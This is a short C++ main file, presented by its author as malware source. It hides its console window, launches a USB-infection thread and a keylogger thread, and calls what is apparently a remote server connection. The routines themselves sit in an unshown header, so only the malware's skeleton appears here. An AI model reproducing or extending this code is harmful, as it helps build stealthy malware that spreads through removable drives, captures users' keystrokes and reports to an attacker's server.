/*

Source code of the last malware I am ever going to write.

*/

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "probe.h"



int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE); // ^_^
    
    HANDLE ht = CreateThread(NULL, 0, System::USBINFECT, NULL, 0, NULL);  // Create Usb Infection thread
    if (ht == NULL)
    {
        exit(1);
    }


    HANDLE kt = CreateThread(NULL, 0, System::KEYLOG_THREAD, NULL, 0, NULL);  // Create Usb Infection thread
    if (kt == NULL)
    {
        exit(1);
    }


    Server::ProbeConnect();
    
    return 0;
}
